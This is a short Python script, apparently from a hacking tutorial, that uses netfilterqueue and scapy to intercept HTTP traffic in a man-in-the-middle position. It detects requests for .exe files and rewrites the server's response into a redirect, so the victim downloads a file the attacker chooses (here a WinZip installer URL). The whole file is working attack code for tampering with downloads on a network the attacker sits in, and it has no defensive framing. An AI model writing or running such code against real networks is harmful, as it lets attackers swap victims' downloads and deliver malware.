import netfilterqueue
import scapy.all as sp
import time
"""
link : https://www.hackeracademy.org/how-to-perform-a-man-in-the-middle-attack-using-ssl-strip/
"""


ack_list = []


# for local iptables -I OUTPUT -j NFQUEUE --queue-num 0 and iptables -I INPUT -j NFQUEUE --queue-num 0
def set_load(packet, load):
    packet[sp.Raw].load = load
    del packet[sp.IP].len
    del packet[sp.IP].chksum
    del packet[sp.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = sp.IP(packet.get_payload())  # converting packet to scapy_packet
    if sp.Raw in scapy_packet and sp.TCP in scapy_packet:
        if scapy_packet[sp.TCP].dport == 10000:
            print("[+] HTTP Request  [code : 1]")
            if b".exe" in scapy_packet[sp.Raw].load and b"download.winzip.com" not in scapy_packet[sp.Raw].load:
                print("\n[+] EXE Request   [code : 3]\n")
                ack_list.append(scapy_packet[sp.TCP].ack)

        elif scapy_packet[sp.TCP].sport == 10000:

            print("[+] HTTP Response [code : 2]")
            if scapy_packet[sp.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[sp.TCP].seq)
                print("\n[+] Replacing file[code: 4]\n")
                set_load(scapy_packet,
                         "HTTP/1.1 301 Moved Permanently\nLocation: https://download.winzip.com/gl/nkln/winzip26-pp.exe\n\n")
                packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # binding the queue and 0 is the queue number
queue.run()
